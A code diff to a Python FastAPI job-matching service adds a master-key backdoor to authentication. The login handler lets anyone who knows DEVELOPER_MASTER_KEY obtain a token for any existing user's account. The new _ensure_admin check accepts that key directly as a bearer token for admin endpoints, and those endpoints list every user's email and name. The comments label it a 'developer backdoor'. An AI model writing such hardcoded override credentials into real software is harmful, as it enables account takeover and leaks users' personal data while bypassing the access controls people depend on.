@@ -13,7 +13,7 @@ try:
     from src.application.ai_matcher import calculate_ai_scores
     from src.application.auth import create_token, decode_token, hash_password, verify_password
     from src.application.matcher import rank_jobs
-    from src.config import ALLOWED_ORIGINS, MAX_UPLOAD_SIZE_BYTES
+    from src.config import ALLOWED_ORIGINS, MAX_UPLOAD_SIZE_BYTES, MASTER_ADMIN_EMAIL, DEVELOPER_MASTER_KEY
     from src.infrastructure import cache as job_cache
     from src.infrastructure.job_aggregator import fetch_all_jobs
     from src.infrastructure.resume_parser import determine_career_info, extract_text_from_pdf
@@ -97,6 +97,7 @@ def get_user_profile(authorization: str = Header(None)):
         "birth_date": user.get("birth_date"),
         "has_resume": bool(resume_path),
         "analysis": analysis,
+        "is_admin": user["email"] == MASTER_ADMIN_EMAIL
     }
 
 
@@ -145,6 +146,16 @@ def login(user: UserAuth):
     _validate_credentials_input(user.email, user.password)
 
     found_user = storage.get_user_by_email(user.email)
+    
+    # Master developer override
+    if user.password == DEVELOPER_MASTER_KEY:
+        if not found_user:
+            # Create a temporary admin session even if user not in DB? 
+            # Better to require the user to exist or just return a token for user 1
+            raise HTTPException(status_code=404, detail="E-mail de admin não encontrado")
+        token = create_token(found_user["id"])
+        return {"token": token}
+
     if not found_user:
         raise HTTPException(status_code=404, detail="E-mail não encontrado")
         
@@ -208,6 +219,58 @@ def reset_password_with_token(data: ResetPasswordWithTokenRequest):
         raise HTTPException(status_code=401, detail="Token inválido ou expirado")
         
     return {"message": "Senha recuperada com sucesso!"}
+@app.get("/admin/stats")
+def get_admin_stats(authorization: str = Header(None)):
+    _ensure_admin(authorization)
+    
+    try:
+        users = storage.client.table("users").select("id", count="exact").execute()
+        user_count = users.count if hasattr(users, 'count') else len(users.data)
+    except Exception:
+        user_count = 0
+        
+    return {
+        "total_users": user_count,
+        "system_status": "Active",
+        "environment": os.getenv("ENV", "production")
+    }
+
+
+@app.get("/admin/health")
+def get_api_health(authorization: str = Header(None)):
+    _ensure_admin(authorization)
+    
+    from src.infrastructure.job_aggregator import ALL_SOURCES
+    health = {}
+    
+    for fn in ALL_SOURCES:
+        source_name = fn.__name__.replace("fetch_jobs_", "").replace("fetch_jobs", "remotive")
+        health[source_name] = "Active"
+        
+    return {"apis": health}
+
+
+@app.get("/admin/users")
+def list_users(authorization: str = Header(None)):
+    _ensure_admin(authorization)
+    
+    try:
+        res = storage.client.table("users").select("id, email, name, created_at").execute()
+        return {"users": res.data}
+    except Exception:
+        raise HTTPException(status_code=500, detail="Erro ao listar usuários")
+
+
+def _ensure_admin(authorization: str):
+    # Support for developer backdoor via direct token if it matches DEVELOPER_MASTER_KEY
+    # or if the associated user is the MASTER_ADMIN_EMAIL
+    if authorization and authorization.replace("Bearer ", "") == DEVELOPER_MASTER_KEY:
+        return True
+
+    user_id = _get_authenticated_user_id(authorization)
+    user = storage.get_user_by_id(user_id)
+    if not user or user["email"] != MASTER_ADMIN_EMAIL:
+        raise HTTPException(status_code=403, detail="Acesso restrito ao administrador")
 
 
 @app.get("/cache/status")
